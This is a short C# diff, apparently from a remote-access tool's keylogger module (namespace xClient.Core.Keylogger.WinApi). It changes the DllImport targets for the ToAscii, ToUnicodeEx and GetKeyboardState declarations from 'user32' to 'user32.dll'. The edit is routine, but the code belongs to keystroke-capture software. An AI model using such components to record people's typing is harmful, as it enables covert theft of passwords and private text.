@@ -185,7 +185,7 @@ namespace xClient.Core.Keylogger.WinApi
         ///     http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winui/winui/windowsuserinterface/userinput/keyboardinput/keyboardinputreference/keyboardinputfunctions/toascii.asp
         /// </remarks>
         [Obsolete("Use ToUnicodeEx instead")]
-        [DllImport("user32")]
+        [DllImport("user32.dll")]
         public static extern int ToAscii(
             int uVirtKey,
             int uScanCode,
@@ -240,7 +240,7 @@ namespace xClient.Core.Keylogger.WinApi
         ///         </item>
         ///     </list>
         /// </returns>
-        [DllImport("user32")]
+        [DllImport("user32.dll")]
         public static extern int ToUnicodeEx(int wVirtKey,
             int wScanCode,
             byte[] lpKeyState,
@@ -263,7 +263,7 @@ namespace xClient.Core.Keylogger.WinApi
         /// <remarks>
         ///     http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winui/winui/windowsuserinterface/userinput/keyboardinput/keyboardinputreference/keyboardinputfunctions/toascii.asp
         /// </remarks>
-        [DllImport("user32")]
+        [DllImport("user32.dll")]
         public static extern int GetKeyboardState(byte[] pbKeyState);
 
         /// <summary>
